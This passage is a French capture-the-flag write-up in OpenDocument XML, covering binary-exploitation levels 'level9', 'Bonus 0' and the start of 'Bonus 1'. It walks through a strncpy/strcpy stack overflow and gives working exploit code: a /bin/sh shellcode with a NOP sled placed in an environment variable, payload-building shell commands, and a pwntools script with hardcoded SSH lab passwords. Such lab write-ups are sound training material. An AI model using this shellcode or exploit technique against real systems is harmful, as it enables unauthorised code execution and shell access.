      <text:p text:style-name="P17"><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level9"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">password=</text:span><text:span text:style-name="T11">"c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a"</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">p</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">s.process([</text:span><text:span text:style-name="T11">"/home/user/level9/./level9"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">payload])</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P10">p.interactive()</text:p>
      <text:p text:style-name="P5">(On a pris un shellcode depuis shellstorm comme d'hab).</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P3"><text:span text:style-name="T17">Got flag</text:span><text:span text:style-name="T19">.</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580763711981721920" text:style-name="L13">
        <text:list-item>
          <text:p text:style-name="P29"><text:soft-page-break/>Bonus 0</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">On a un programme qui prend deux inputs via <text:span text:style-name="T3">stdin</text:span> et semble concaténer les deux chaînes, en ajoutant un espace entre elles :</text:p>
      <text:p text:style-name="P2"><draw:frame draw:style-name="fr2" draw:name="images14" text:anchor-type="paragraph" svg:x="0.097cm" svg:y="0cm" svg:width="6.854cm" svg:height="2.886cm" draw:z-index="13"><draw:image xlink:href="Pictures/2000000700001AC600000B45B2AE05DA.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2">Le code source reconstruit ressemble à cela :</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P14">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P16">#include &lt;unistd.h&gt;</text:p>
      <text:p text:style-name="P16">#include &lt;string.h&gt;</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T1">void</text:span> <text:s text:c="3"/><text:span text:style-name="T8">p</text:span><text:span text:style-name="T4">(</text:span><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">*s,</text:span> <text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">*sep)</text:span></text:p>
      <text:p text:style-name="P19">{</text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">puts(sep);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">buffer[</text:span><text:span text:style-name="T10">0x1008</text:span><text:span text:style-name="T4">];</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">read(</text:span><text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">buffer,</text:span> <text:span text:style-name="T10">0x1000</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">*nl</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">strchr(buffer,</text:span> <text:span text:style-name="T11">'\n'</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">*nl</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T11">'\0'</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">strncpy(s,</text:span> <text:span text:style-name="T4">buffer,</text:span> <text:span text:style-name="T10">20</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P19">}</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T1">void</text:span> <text:s text:c="3"/><text:span text:style-name="T8">pp</text:span><text:span text:style-name="T4">(</text:span><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">*s)</text:span></text:p>
      <text:p text:style-name="P19">{</text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">s2[</text:span><text:span text:style-name="T10">20</text:span><text:span text:style-name="T4">];</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">p(s2,</text:span> <text:span text:style-name="T11">" - "</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">s3[</text:span><text:span text:style-name="T10">20</text:span><text:span text:style-name="T4">];</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">p(s3,</text:span> <text:span text:style-name="T11">" - "</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">strcpy(s,</text:span> <text:span text:style-name="T4">s2);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T4">i</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T4">(s[i])</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">i++;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">s[i]</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T11">' '</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">strcat(s,</text:span> <text:span text:style-name="T4">s3);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P19">}</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T8">main</text:span><text:span text:style-name="T4">(</text:span><text:span text:style-name="T1">void</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P19">{</text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">char</text:span> <text:s text:c="3"/><text:span text:style-name="T4">s[</text:span><text:span text:style-name="T10">54</text:span><text:span text:style-name="T4">];</text:span> <text:s text:c="7"/></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">pp(s);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">puts(s);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T4">(</text:span><text:span text:style-name="T10">0</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P10">}</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/>Rien de très particulier ou de nouveau dans le code désassemblé pour reconstruire le code source. La vulnérabilité est cependant la suivante.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Le programme est construit afin de concaténer <text:span text:style-name="T3">deux chaînes de caractères de 20 bytes</text:span><text:span text:style-name="T12"> ; la taille du buffer dans la fonction </text:span><text:span text:style-name="T3">main </text:span><text:span text:style-name="T12">est déterminée à partir de cet objectif du programme.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">C'est d'ailleurs pour cela que, dans la fonction </text:span><text:span text:style-name="T3">p</text:span><text:span text:style-name="T12">, malgré un </text:span><text:span text:style-name="T3">read </text:span><text:span text:style-name="T12">de taille 0x1000, seuls les 20 premiers bytes du buffer sont copiés dans la chaîne passée en argument de la fonction.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">La vulnérabilité se situe cependant dans l'appel à </text:span><text:span text:style-name="T3">strcpy </text:span><text:span text:style-name="T12">effectué dans la fonction </text:span><text:span text:style-name="T3">pp</text:span><text:span text:style-name="T12">. En effet, dans la fonction </text:span><text:span text:style-name="T3">p</text:span><text:span text:style-name="T12">, le NULL BYTE de fin n'est inséré qu'au premier '\n' rencontré. Imaginons cependant que l'utilisateur a entré un input supérieur à 20 bytes (de 40 bytes par exemple, 40 * 'A'). La fonction </text:span><text:span text:style-name="T3">strncpy </text:span><text:span text:style-name="T12">ne rajoute pas de NULL BYTE ; dans la chaîne </text:span><text:span text:style-name="T3">s2 </text:span><text:span text:style-name="T12">suite au premier appel à </text:span><text:span text:style-name="T3">p</text:span><text:span text:style-name="T12">, on aura donc 20 'A' et cette chaîne ne sera pas terminée par un NULL BYTE.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">Le buffer </text:span><text:span text:style-name="T3">s3</text:span><text:span text:style-name="T12"> étant déclaré juste après dans la fonction, </text:span><text:span text:style-name="T3">s3 est adjacent en mémoire avec s2</text:span><text:span text:style-name="T12">. Un appel à </text:span><text:span text:style-name="T3">p </text:span><text:span text:style-name="T12">remplit également </text:span><text:span text:style-name="T3">s3</text:span><text:span text:style-name="T12">, disons cette fois de 20 'B'. Il est probable cependant qu'un NULL BYTE suive ces 20 'B' puisqu'aucune variable locale de suit </text:span><text:span text:style-name="T3">s3</text:span><text:span text:style-name="T12"> en mémoire dans la fonction.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">On a donc cette configuration en mémoire :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images15" text:anchor-type="paragraph" svg:width="16.471cm" svg:height="3.997cm" draw:z-index="14"><draw:image xlink:href="Pictures/2000000700003B3A00000E5F8CCD1900.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T12">Lorsque la fonction </text:span><text:span text:style-name="T3">strcpy</text:span><text:span text:style-name="T12"> dans </text:span><text:span text:style-name="T3">pp </text:span><text:span text:style-name="T12">va tenter de copier </text:span><text:span text:style-name="T3">s2 </text:span><text:span text:style-name="T12">dans </text:span><text:span text:style-name="T3">s</text:span><text:span text:style-name="T12">, elle va en réalité copier </text:span><text:span text:style-name="T3">s2 ET s3 </text:span><text:span text:style-name="T12">car aucun NULL BYTE ne lui permet de distinguer les deux chaînes. 40 bytes au lieu de 20 sont ainsi copiés dans </text:span><text:span text:style-name="T3">s</text:span><text:span text:style-name="T12">.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T14">s -&gt; 20 * 'A' + 20 * 'B'</text:span><text:span text:style-name="T12"><text:tab/><text:tab/><text:tab/>(40 bytes)</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">Ensuite, un espace ainsi que la chaîne </text:span><text:span text:style-name="T3">s3 </text:span><text:span text:style-name="T12">sont ajoutés comme convenu. La chaîne </text:span><text:span text:style-name="T3">s </text:span><text:span text:style-name="T12">contient désormais :</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T14">s -&gt; 20 * 'A' + 20 * 'B' + ' ' + 20 * 'B'</text:span><text:span text:style-name="T12"><text:tab/><text:tab/>(61 bytes)</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">Cela provoque un overflow du buffer </text:span><text:span text:style-name="T3">s </text:span><text:span text:style-name="T12">qui n'est pas censé contenir autant de bytes ; ce qui provoque un SEGFAULT du programme car l'adresse de retour de </text:span><text:span text:style-name="T3">main </text:span><text:span text:style-name="T12">est écrasée.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images16" text:anchor-type="paragraph" svg:width="18.549cm" svg:height="5.907cm" draw:z-index="15"><draw:image xlink:href="Pictures/200000070000536900001A914AEBB3B7.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T12">(Un '\0' ne suivait pas immédiatement </text:span><text:span text:style-name="T3">s3</text:span><text:span text:style-name="T12"> ici). Suite au </text:span><text:span text:style-name="T3">strcat</text:span><text:span text:style-name="T12"> :</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images17" text:anchor-type="paragraph" svg:width="20.749cm" svg:height="1.392cm" draw:z-index="16"><draw:image xlink:href="Pictures/2000000700007834000008119D8F4F51.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2">Puis on crash à l'adresse 0x42424242 ; ce qui signifie que nous avons bien <text:span text:style-name="T3">le contrôle d'EIP</text:span><text:span text:style-name="T12">. Puisque c'est la chaîne </text:span><text:span text:style-name="T3">s3 </text:span><text:span text:style-name="T12">qui dépasse sur l'adresse de retour de </text:span><text:span text:style-name="T3">main </text:span><text:span text:style-name="T12">(c'est cette chaîne qui, suite à la concaténation, se retrouve en dernier), c'est quelque part dans cette chaîne que l'adresse de retour est écrasée et que nous souhaitons placer notre adresse.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">Avant d'aller plus loin, ce genre de programme prend plusieurs inputs successifs via des appels à </text:span><text:span text:style-name="T3">read</text:span><text:span text:style-name="T12">. Le debugging est un peu plus compliqué dans le sens où l'on ne peut donner des </text:span><text:span text:style-name="T3">raw bytes </text:span><text:span text:style-name="T12">au programme via </text:span><text:span text:style-name="T3">stdin</text:span><text:span text:style-name="T12">, et qu'on ne peut utiliser l'indirection comme on le faisait avant lorsqu'un unique appel à stdin était effectué.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">On peut utiliser pwntools pour intéragir avec le programme et </text:span><text:span text:style-name="T3">gdb.debug</text:span><text:span text:style-name="T12"> pour débugger en même temps (voir </text:span><text:span text:style-name="T3">level1</text:span><text:span text:style-name="T12">), cependant cela n'est possible qu'en local (car gdbserver n'est pas installé sur la machine distante), donc avec les mauvaises adresses.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">Un trick qu'on peut cependant utiliser afin de fournir des inputs successifs à </text:span><text:span text:style-name="T3">stdin </text:span><text:span text:style-name="T12">à partir d'un seul fichier est le suivant.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">&gt; Chaque </text:span><text:span text:style-name="T3">read </text:span><text:span text:style-name="T12">prend en input un buffer de 0x1000 (4096) bytes (voir code source ci-dessus).</text:span></text:p>
      <text:p text:style-name="P4">&gt; Dans le fichier, on inscrit 4095 'A', puis un '\n'. Lorsque le programme va lire depuis stdin, il va s'arrêter suite à ces 4096 bytes pour le premier read, et envoyer ces données au programme.</text:p>
      <text:p text:style-name="P4">&gt; Dans le fichier, on inscrit ensuite ce qu'on veut envoyer au programme via son second read. En effet, lorsque le programme va essayer d'effectuer son second read, il tombera sur ces données qui sont encore dans stdin.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Par exemple :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images18" text:anchor-type="paragraph" svg:width="19.396cm" svg:height="9.551cm" draw:z-index="17"><draw:image xlink:href="Pictures/2000000700004B8E00002536A8737C8B.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P2">Cherchons maintenant l'offset auquel, dans la seconde chaîne <text:span text:style-name="T3">s3</text:span><text:span text:style-name="T12">, l'adresse de retour de </text:span><text:span text:style-name="T3">main </text:span><text:span text:style-name="T12">est écrasée. On crée un pattern metasploit à envoyer dans notre seconde chaîne, et on observe l'adresse du crash :</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images19" text:anchor-type="paragraph" svg:width="18.999cm" svg:height="8.105cm" draw:z-index="18"><draw:image xlink:href="Pictures/2000000700005DBF000028007C0F4AAA.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2">L'offset est de <text:span text:style-name="T3">9</text:span><text:span text:style-name="T12">. Les adresses 10 – 11 – 12 – 13 contrôlent donc EIP.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">Comment exécuter notre payload à partir de là, vers quelle adresse rediriger le programme ? La stack est exécutable (</text:span><text:span text:style-name="T3">NX disabled</text:span><text:span text:style-name="T12">), on peut donc y placer notre shellcode. On pourrait par exemple le placer dans le buffer </text:span><text:span text:style-name="T3">s</text:span><text:span text:style-name="T12"> (au début du buffer, à la place des 20 'A' puis des 20 'B'). Ce qui fonctionnerait (fonctionne tout court), mais nécessite cependant de rediriger vers l'adresse exacte du début du buffer sur la stack, ce qui est simple à reproduire dans GDB, mais plus pénible ensuite lorsqu'on doit l'exécuter en conditions réelles car les adresses varient légèrement (voir </text:span><text:span text:style-name="T3">level 5</text:span><text:span text:style-name="T12">).</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">Le plan est de mettre notre payload dans une </text:span><text:span text:style-name="T3">variable d'environnement</text:span><text:span text:style-name="T12">, d'ajouter au début du </text:span><text:soft-page-break/><text:span text:style-name="T12">payload une </text:span><text:span text:style-name="T3">importante NOPsled</text:span><text:span text:style-name="T12">, et de rediriger le programme quelque part au milieu de cette NOPsled. Cela devrait permettre de neutraliser les variations des adresses sur la stack dues aux différences de variables d'environnement / d'arguments de programme.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">D'abord, créons cette variable d'environnement contenant notre payload, et récupérons son adresse approximative sur la stack. On lance cette commande sur la machine cible :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P7">env -i PAYLOAD=$(python -c "print('\x90' * 500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')") gdb bonus0 </text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">(NOTE : env -i permet d'exécuter les commandes qui suivent sans aucun environnement hérité de notre shell).</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">On lance ici <text:span text:style-name="T3">gdb </text:span><text:span text:style-name="T12">avec uniquement notre variable d'environnement PAYLOAD (il ajoute également LINES et COLUMNS, mais ça doit être un comportement par défaut pour gdb). On cherche ensuite où se situe, sur la stack, notre variable :</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P8">(gdb) x /500s $sp</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images20" text:anchor-type="paragraph" svg:width="13.573cm" svg:height="10.956cm" draw:z-index="19"><draw:image xlink:href="Pictures/200000070000350600002ACBEB1EBFE0.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2">La variable d'environnement est stockée à l'adresse 0xbffffd9f.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">On aurait également pu trouver l'adresse de la variable avec un petit programme en C :</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P6">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P6">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6">int main(void)</text:p>
      <text:p text:style-name="P6">{</text:p>
      <text:p text:style-name="P6"><text:tab/>printf("PAYLOAD is at %p\n", getenv("PAYLOAD"));</text:p>
      <text:p text:style-name="P6"><text:soft-page-break/><text:tab/>return (0);</text:p>
      <text:p text:style-name="P6">}</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6">$&gt; gcc getenv.c -o getenv</text:p>
      <text:p text:style-name="P6">$&gt; <text:span text:style-name="T12">env -i PAYLOAD=$(python -c "print('\x90' * 500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')") ./getenv</text:span></text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">On trouve des adresses légèrement différentes entre GDB et le programme C, la stack a dû un peu bouger. Quoi qu'il en soit, on peut désormais lancer notre exploit. En adresse de retour, on va devoir choisir une adresse qui pointe dans la NOPsled de notre variable d'environnement, donc après l'adresse de départ de cette variable ; on choisit <text:span text:style-name="T13">0xbffffe67</text:span>.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">&gt;&gt; <text:span text:style-name="T15">Exploitation manuelle</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P23">python -c <text:span text:style-name="T20">"print('A' * 4095 + '\n' + 'B' * 9 + '\x67\xfe\xff\xbf' + 'D' * 7 + '\n')"</text:span> &gt; /tmp/payload</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P23">cat /tmp/payload - | env -i <text:span text:style-name="T22">PAYLOAD</text:span><text:span text:style-name="T24">=</text:span><text:span text:style-name="T26">$(</text:span>python -c <text:span text:style-name="T20">"print('\x90' * 500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')"</text:span><text:span text:style-name="T26">)</text:span> ./bonus0</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">NOTE : lorsqu'on exécute le programme cible avec notre payload, on utilise pas l'indirection mais un cat suivi d'un '-' ; on a déjà abordé les problèmes de l'indirection lorsqu'on veut appeler <text:span text:style-name="T3">system</text:span><text:span text:style-name="T12"> car stdin se ferme directement (</text:span><text:span text:style-name="T3">level2</text:span><text:span text:style-name="T12">) ; cette synthaxe permet justement de garder stdin ouvert :</text:span></text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://stackoverflow.com/questions/55527028/shellcode-successfully-executes-bin-sh-but-immediately-terminates" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T12">https://stackoverflow.com/questions/55527028/shellcode-successfully-executes-bin-sh-but-immediately-terminates</text:span></text:a><text:span text:style-name="T12"> </text:span></text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://stackoverflow.com/questions/30972544/gdb-exiting-instead-of-spawning-a-shell" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T12">https://stackoverflow.com/questions/30972544/gdb-exiting-instead-of-spawning-a-shell</text:span></text:a><text:span text:style-name="T12"> </text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">&gt;&gt; </text:span><text:span text:style-name="T16">Exploit automatique</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P21"><text:span text:style-name="T1">from</text:span> <text:span text:style-name="T9">pwn</text:span> <text:span text:style-name="T1">import</text:span> <text:span text:style-name="T4">*</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P22">### AUTOMATED EXPLOIT ###</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T4">payload_1</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">b</text:span><text:span text:style-name="T11">'A'</text:span> <text:span text:style-name="T4">*</text:span> <text:span text:style-name="T10">60</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">payload_2</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">b</text:span><text:span text:style-name="T11">'B'</text:span> <text:span text:style-name="T4">*</text:span> <text:span text:style-name="T10">9</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">payload_2</text:span> <text:span text:style-name="T4">+=</text:span> <text:span text:style-name="T4">b</text:span><text:span text:style-name="T11">'\x67\xfe\xff\xbf'</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">payload_2</text:span> <text:span text:style-name="T4">+=</text:span> <text:span text:style-name="T4">b</text:span><text:span text:style-name="T11">'D'</text:span> <text:span text:style-name="T4">*</text:span> <text:span text:style-name="T10">7</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><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bonus0"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">password=</text:span><text:span text:style-name="T11">"f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728"</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">p</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">s.process([</text:span><text:span text:style-name="T11">"/home/user/bonus0/./bonus0"</text:span><text:span text:style-name="T4">],</text:span> <text:span text:style-name="T4">env={</text:span><text:span text:style-name="T11">"PAYLOAD"</text:span><text:span text:style-name="T4">:</text:span> <text:span text:style-name="T4">b</text:span><text:span text:style-name="T11">'\x90'</text:span><text:span text:style-name="T4">*</text:span><text:span text:style-name="T10">500</text:span><text:span text:style-name="T4">+b</text:span><text:span text:style-name="T11">'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'</text:span><text:span text:style-name="T4">})</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T4">p.recvline(</text:span><text:span text:style-name="T10">1</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P19">p.sendline(payload_1)</text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">p.recvline(</text:span><text:span text:style-name="T10">1</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P19"><text:soft-page-break/>p.sendline(payload_2)</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P10">p.interactive()</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">On voit qu'on définit la variable d'environnement contenant notre payload au lancement du process via ssh.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P3">Got flag<text:span text:style-name="T1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08245394862249586" text:style-name="L14">
        <text:list-item>
          <text:p text:style-name="P26"><text:soft-page-break/>Bonus 1</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">La reconstruction du code source est très basique cette fois :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P15">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P16">#include &lt;unistd.h&gt;</text:p>
      <text:p text:style-name="P16">#include &lt;string.h&gt;</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T8">main</text:span><text:span text:style-name="T4">(</text:span><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T4">argc,</text:span> <text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">**argv)</text:span></text:p>
      <text:p text:style-name="P19">{</text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">char</text:span> <text:s text:c="3"/><text:span text:style-name="T4">buff[</text:span><text:span text:style-name="T10">40</text:span><text:span text:style-name="T4">];</text:span> <text:s text:c="11"/><text:tab/><text:span text:style-name="T6">// [esp+0x14]</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T4">n</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">atoi(argv[</text:span><text:span text:style-name="T10">1</text:span><text:span text:style-name="T4">]);</text:span> <text:s text:c="8"/><text:span text:style-name="T6">// [esp+0x3c]</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T4">(n</text:span> <text:span text:style-name="T4">&gt;</text:span> <text:span text:style-name="T10">9</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T4">(</text:span><text:span text:style-name="T10">1</text:span><text:span text:style-name="T4">);</text:span></text:p>
